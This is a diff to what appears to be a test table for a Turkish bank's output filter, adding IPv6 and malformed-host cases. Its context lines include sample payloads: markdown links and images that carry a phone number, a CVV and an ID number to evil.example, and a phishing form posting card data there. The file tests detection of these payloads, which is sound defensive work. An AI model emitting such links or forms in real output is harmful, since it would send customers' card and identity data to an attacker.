@@ -47,6 +47,9 @@ def cases(canary):
         ("phone in a path", "[tıkla](https://evil.example/u/0532%20111%2022%2033)", "review", "evil.example"),
         ("cvv after its key", "[tıkla](https://evil.example/k?cvv=123)", "review", "evil.example"),
         ("tc as a subdomain", "![x](https://10000000146.evil.example/p.png)", "review", "evil.example"),
+        # A bracketed host is read whole, not cut at its "]"; one urlsplit can't read is reviewed.
+        ("tc after an ipv6 host", "Sunucu: https://[2001:db8::1]/k?t=10000000146", "review", "10000000146"),
+        ("malformed host", "Sayfa: http://[ornekbank/giris", "review", None),
         # Forms, links and tags that take the user somewhere else.
         ("phishing form", 'Kartınızı doğrulayın: <form action="https://evil.example/giris"><input name="kart"></form>',
          "review", "evil.example"),
@@ -77,6 +80,7 @@ def cases(canary):
         ("own image", "![kampanya](https://www.ornekbank.com.tr/img/kampanya.png)", "allow", None),
         ("own link", "[Başvuru](https://www.ornekbank.com.tr/basvuru?urun=kredi-karti-platinum-plus)", "allow", None),
         ("normal link", "Detaylar için [SSS](https://example.com/sss) sayfasına bakın.", "allow", None),
+        ("ipv6 link", "Sunucu: https://[2001:db8::1]/durum", "allow", None),
         ("placeholder kept", "IBAN'ınız [IBAN] olarak kayıtlı.", "allow", None),
         ("own html link", '<a href="https://www.ornekbank.com.tr/basvuru?urun=kredi-karti-platinum-plus">Başvuru</a>', "allow", None),
         ("plain html", "<b>Önemli:</b> <i>Şifrenizi</i> kimseyle paylaşmayın.<br>", "allow", None),
